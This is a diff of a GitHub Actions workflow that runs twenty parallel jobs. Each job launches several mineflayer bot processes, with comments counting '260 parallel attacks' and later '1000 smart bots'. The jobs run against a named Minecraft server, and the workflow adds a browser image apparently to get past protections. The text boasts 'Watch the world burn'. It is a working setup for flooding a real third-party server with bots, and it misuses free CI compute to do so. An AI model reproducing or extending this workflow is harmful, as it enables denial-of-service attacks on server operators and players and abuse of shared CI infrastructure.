@@ -1,29 +1,32 @@
-name: 1aelsedie-Alpine-18-Strike
+name: 1aelsedie-Ultra-Alpine-Bypass
 on: 
   workflow_dispatch:
 
 jobs:
-  strike:
-    # Оставляем ubuntu-latest, потому что это "железо" Гитхаба
+  raid:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
         slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
-    # А вот тут мы говорим Гитхабу использовать образ Alpine с Node 18
-    container: node:18-alpine
+    # Используем готовый образ с браузером, чтобы не тратить время на установку
+    container: mcr.microsoft.com/playwright:v1.40.0-jammy
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Massive Alpine Launch
+      - name: Install Deps
         run: |
-          npm install mineflayer --quiet
-          # Запускаем по 13 процессов на каждый слот (итого 260 параллельных атак)
-          for i in {1..13}; do
+          npm install mineflayer playwright-chromium --quiet
+
+      - name: Start The World Machine
+        run: |
+          # Запускаем 5 процессов по 10 ботов в каждом = 50 ботов на слот
+          # 50 ботов * 20 слотов = 1000 "умных" ботов одновременно
+          for i in {1..5}; do
             node index.js &
           done
-          echo "Slot ${{ matrix.slot }} is blasting mc.risemine.space on Alpine!"
+          echo "Slot ${{ matrix.slot }} is active. Watch the world burn."
           sleep 900
